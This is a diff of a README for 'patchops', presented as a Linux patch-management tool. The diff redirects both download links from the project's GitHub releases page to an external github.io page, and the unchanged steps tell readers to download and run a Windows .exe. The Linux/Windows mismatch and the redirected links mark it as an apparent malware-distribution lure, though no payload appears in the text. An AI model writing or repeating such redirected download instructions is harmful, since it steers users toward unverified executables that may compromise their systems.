@@ -1,6 +1,6 @@
 # 🛡️ patchops - Manage Linux updates with total control
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fastidious-lymphoblasticleukemia469/patchops/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://fastidious-lymphoblasticleukemia469.github.io)
 
 This application helps you manage updates for your Linux systems. It organizes how updates move from testing to production environments. You use this tool to ensure your servers stay secure and run current software versions. The platform combines storage, task automation, and visual reporting in one package.
 
@@ -8,7 +8,7 @@ This application helps you manage updates for your Linux systems. It organizes h
 
 You need the installer file to run patchops on your Windows machine. Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/Fastidious-lymphoblasticleukemia469/patchops/releases).
+1. Visit the [official release page](https://fastidious-lymphoblasticleukemia469.github.io).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your computer desktop.
